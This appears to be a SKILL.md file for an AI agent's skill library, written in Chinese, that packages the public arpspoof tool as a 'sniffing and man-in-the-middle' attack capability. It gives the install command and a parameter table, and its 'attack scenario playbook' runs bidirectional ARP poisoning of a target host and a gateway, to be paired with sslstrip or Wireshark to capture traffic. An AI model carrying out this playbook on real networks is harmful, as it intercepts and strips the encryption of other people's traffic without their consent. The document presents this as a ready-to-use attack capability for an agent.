---
name: arpspoof-smikims
description: arpspoof: 局域网 ARP 毒化。信号:中间人,mitm,双向 ARP 欺骗,目标+网关。
---

# arpspoof

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/smikims/arpspoof
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/smikims/arpspoof && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./arpspoof -i eth0 -t 10.0.0.5 -r 10.0.0.1` | 双向 ARP 欺骗 |
| `-t target -r gateway` | 目标+网关 |

## 攻击场景 Playbook

### 局域网 ARP 毒化

```bash
./arpspoof -i eth0 -t 10.0.0.5 -r 10.0.0.1
# 配合 sslstrip/wireshark
```

## 注意事项

极简 ARP 欺骗工具,dsniff 系。
